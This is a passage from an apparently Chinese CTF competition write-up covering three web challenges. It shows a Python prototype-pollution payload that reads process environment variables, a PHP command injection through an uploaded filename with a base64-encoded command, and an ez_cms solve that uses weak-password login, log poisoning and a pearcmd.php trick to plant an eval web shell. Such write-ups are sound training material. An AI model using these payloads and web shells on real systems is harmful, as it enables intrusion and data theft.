class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计源码，存在标志性函数merge，为python类原型链污染，继续审计发现可利用函数open(‘’,’’).read()，构造json代码，修改<strong>FILE</strong>的数值为想要读取的内容，这里读取环境变量</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;</span><br><span class="line"><span class="regexp">//</span>前面的username和password是为了绕过代码检查</span><br></pre></td></tr></table></figure><p>提交后经检查发现字符串<strong>init</strong>被过滤</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里可以使用unicode编码进行绕过</span><br><span class="line"><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;<span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span>&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br><span class="line">或者使用user类的check函数进行实例化绕过</span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;check&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">session_start</span>();</span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$size</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="language-php">    </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyPicDisk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;form method=&quot;POST&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&#x27;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &#x27;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span></span><br><span class="line"><span class="language-php">          &#125;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>分析源码</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果不存在session[<span class="string">&#x27;user&#x27;</span>]，出现登录表单，提交表单之后就会给session[<span class="string">&#x27;user&#x27;</span>]进行赋值。</span><br><span class="line">第一次登录后再回到原表单就会触发js提示不是<span class="literal">admin</span>，并获得源码文件的位置，进入下一个if</span><br><span class="line"></span><br><span class="line">如果不存在<span class="keyword">file</span>，那就触发文件上传表单，action为index.php，如果存在上传文件，那么就对文件后缀进行判断并返回上传成功提示</span><br><span class="line">如果存在<span class="keyword">file</span>，那么就将文件名赋值给<span class="variable">$filename</span>，然后引用<span class="keyword">FILE</span>类对文件名进行处理，construct主要是过滤了/和多个.，且判断了文件是否存在，如果文件存在，那么就执行<span class="params">system</span>函数</span><br></pre></td></tr></table></figure><p>具体操作<img src="../笔记图/image-20230722205634843.png" alt=""></p><p><img src="../笔记图/image-20230722205650142.png" alt="image-20230722205650142"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://2f3204e1-d884-4172-86aa-0ac751e580de.node4.buuoj.cn:81/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">写表单进行登录和文件上传，上传文件之后再用另一个界面进行<span class="built_in">get</span>传<span class="built_in">file</span>，传入的<span class="built_in">file</span>名必须和上传的文件名是一样的，进而触发<span class="keyword">system</span>命令执行。</span><br><span class="line">由于对/和.具有严格过滤，所以这里采用编码绕过</span><br><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br><span class="line">bp传参需要把空格改为+号</span><br></pre></td></tr></table></figure><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看到是个网页直接盲猜一手后台管理界面/admin，然后弱口令试了一下就进去了</span><br></pre></td></tr></table></figure><p><img src="../笔记图/image-20230722211756542.png" alt="image-20230722211756542"></p><p>这里是有一个任意文件读取漏洞，but好像没什么卵用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后就想是否可以进行日志包含</span><br><span class="line">添加UA：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chuling]); <span class="meta">?&gt;</span></span><br><span class="line">然后访问url:   url/admin/r=../../../../../../<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">用蚁剑尝试连接，结果失败了。</span><br></pre></td></tr></table></figure><p>这时候就又来了一个pearcmd.php文件包含</p><p>参考博客：<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">https://blog.csdn.net/Mrs_H/article/details/122386511</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">具体操作为?+config-create+<span class="regexp">/&amp;r=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/share/</span>php<span class="regexp">/pearcmd&amp;/</span>&lt;?=eval(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>chuling2.php</span><br><span class="line"></span><br><span class="line">成功之后直接蚁剑连接得到flag</span><br></pre></td></tr></table></figure><p><img src="../笔记图/image-20230722214619617.png" alt="image-20230722214619617"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
